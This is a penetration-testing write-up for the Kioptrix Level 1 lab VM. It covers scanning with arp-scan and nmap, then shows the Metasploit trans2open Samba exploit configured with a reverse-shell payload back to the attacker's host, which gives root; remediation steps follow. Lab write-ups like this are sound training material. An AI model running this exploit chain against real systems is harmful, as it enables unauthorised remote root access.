# Kioptrixlv1-hacking
This is a hacking lab on kioptrix vulnerable lab.
### Kioptrix: Level 1 - Penetration Testing Write-Up

## Executive Summary

Kioptrix Level 1 is a beginner-level vulnerable virtual machine designed to acquire basic penetration testing skills. The objective is to gain root access to the target system.

---

## 1. Host Discovery
The target machine was located on the local network using `arp-scan`.

```bash
sudo arp-scan -l

```


*Figure 1: `arp-scan` output identifying the target IP address `10.0.2.5`.*

---

## 2. Service Enumeration

An aggressive Nmap scan was conducted to discover open ports, running services, and underlying OS versions.

```bash
sudo nmap -p- -sS -sV -sC 10.0.2.5

```


*Figure 2: Nmap results revealing active services: SSH (22), HTTP (80), Samba/NetBIOS (139), and HTTPS (443).*

### Key Discoveries:

* **Web Server:** Apache 1.3.20 running on Red Hat Linux with `mod_ssl/2.8.4`
* **File Sharing:** Samba `smbd` (Workgroup: `MYGROUP`)

---

## 3. Web Reconnaissance

Visiting the target's IP address (`http://10.0.2.5/`) via browser confirmed a standard Apache web server installation page.


*Figure 3: Default Apache landing page.*

---

## 4. Vulnerability Assessment & Metasploit Lookup

Searching Metasploit for known vulnerabilities in older Samba distributions (`2.2.x`).

```bash
msfconsole
msf6 > search samba

```


*Figure 4: Locating the `exploit/linux/samba/trans2open` module.*

---

## 5. Exploitation

Selecting and configuring the `trans2open` buffer overflow exploit along with a reverse shell payload.

```bash
use exploit/linux/samba/trans2open
set RHOSTS 10.0.2.5
set payload generic/shell_reverse_tcp
set LHOST 10.0.2.3
set LPORT 4444
run

```


*Figure 5: Setting exploit targets, payload, and listener options.*

---

## 6. Root Access & Verification

Executing the exploit successfully established a reverse command shell with full root-level privileges.

```bash
whoami
# root

pwd
# /

```


*Figure 6: Interactive root shell session established on the target.*

---

## Remediation & Mitigation Strategies

1. **Patch & Upgrade Samba:** Upgrade Samba to a modern, supported version (4.x series) to remediate the `trans2open` buffer overflow vulnerability.
2. **Upgrade Web Infrastructure:** Update Apache and OpenSSL to stable modern releases to patch legacy `mod_ssl` vulnerabilities and disable weak protocols (SSLv2/SSLv3).
3. **Network Filtering:** Restrict access to SMB/NetBIOS ports (`139`/`445`) via host-based and network firewalls so only designated endpoints can communicate with file services.
